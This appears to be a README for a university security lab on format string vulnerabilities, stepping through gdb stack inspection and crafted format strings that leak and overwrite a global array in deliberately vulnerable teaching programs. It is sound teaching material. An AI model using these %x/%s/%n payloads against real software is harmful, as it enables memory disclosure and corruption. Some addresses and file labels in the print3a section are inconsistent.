------------------------------------------------------------------------------
                        Secure Systems Engineering
              RISE Lab, Indian Institute of Technology Madras
------------------------------------------------------------------------------
--- Format String Vulnerabilities ----

This directory contains code related to format string vulnerabilities.
These codes would need to be tuned before you can get it to work on your
platform.

Run 

$ make

to make all executable

------------------------------------------------------------------------------
--- print2.c ---

The objective here is to print the contents  of the global array s using a
format string vulnerability. This format string is set in line 15 using a 
strcpy. 

* To get this code to work. We need to first find the address of s.
Obtain this as follows...

$ ./print2 
0804a040
Segmentation fault (core dumped)

So, the address of s is 0x0804a040. This is going to be a constant at
each execution and will not change unless you recompile the program.
Don't bother about the segmentation fault right now. We will fix that later.

* Next, we need to know the stack structure.
Get this by doing the follows

$gdb ./print2
.
.
.
(gdb) b 16    ## this corresponds to the printf(user_string) line
(gdb) run
16		printf(user_string);
(gdb) p &user_string 
$1 = (char (*)[100]) 0xffffd028  ## this is the address of user_string.

(gdb) 
(gdb) si 
0x0804851a	16		printf(user_string);
(gdb) si 
0x0804851d	16		printf(user_string);
(gdb) si 
0x08048350 in printf@plt ()     ## we are now in the printf 

# Now, let us look at the stack contents when execution is in printf

(gdb) x/16x $esp
0xffffd010:	0xffffd028	0x00000000	0x00000064	0x00000000
0xffffd020:	0xffffd0d4	0xffffd048	0x0804a040	0x20782520
0xffffd030:	0x25207825	0x78252078	0x20782520	0x25207825
0xffffd040:	0x00000073	0x00000000	0x00000000	0x00000000

## Note that the stack location 0xffffd010 has 0xffffd028 (user_string)
## also note that location 0xffffd028 has 0x0804a040 (the global s).
## the offset between these two is 6 32-bit words.
## So, now we know that there should be 6 %x in the format string followed
## by a %s. We update print2.c as follows:

15		strcpy(user_string , "\x40\xa0\x04\x08 %x %x %x %x %x %x %s"); 

## Note the 6 %x followed by %s
## Also note the address of the global s, specified in little endian notation.

## Recompile and execute

$ make clean; make print2
$ ./print2
0804a040
@� 0 64 0 ffffd134 ffffd0a8 THIS IS A TOP SECRET MESSAGE!!!

## tada! we have the contents of s getting leaked out through the printf.



------------------------------------------------------------------------------
--- print2a.c ---

This is a slightly optimized version of print2.c. 
The only difference is in forming the format string.

>print2.c
strcpy(user_string , "\x40\xa0\x04\x08 %x %x %x %x %x %x %s"); 
<print2a.c
strcpy(user_string , "\x40\xa0\x04\x08%6$s"); 

Both format strings will produce the same output. The %6$s tells prints
to print the 6th argument that is passed to it. 

Note: The address of s may differ between the programs and needs to set
appropriately. Refer to the section on print2.c to determine how this can
be achieved.

------------------------------------------------------------------------------
--- print3a.c ---

This program is also similar to print2.c However, instead of just printing
the contents of the global array s, we now modify it. Again the important 
difference between print2.c and print3a.c is in the format string:

>print2.c
strcpy(user_string , "\x40\xa0\x04\x08 %x %x %x %x %x %x %s"); 
<print2a.c
strcpy(user_string , "\xa8\x96\x04\x08 %53x %6$n")

Here, the %6$n specifies the a memory address (namely 080496a8, global s),
which gets filled with the number of bytes that printf has printed so far.
In this case it is 59.

The output of the program will look something like this:

$ ./print3a 
0804a02c
,�                                                     0 
59

The value of s printed is 59

------------------------------------------------------------------------------
--- print3b.c ---

This is similar to print3a. Instead of writing 32 bits into s, we split the
writing into 2 16 bits using %hn.
The output looks like this:
$ ./print3b 
0804a02c
,�.� 00000000 00000064 00000000 ffffd134 ffffd0a8  
00370036

The contents of s is now 0x00360037.
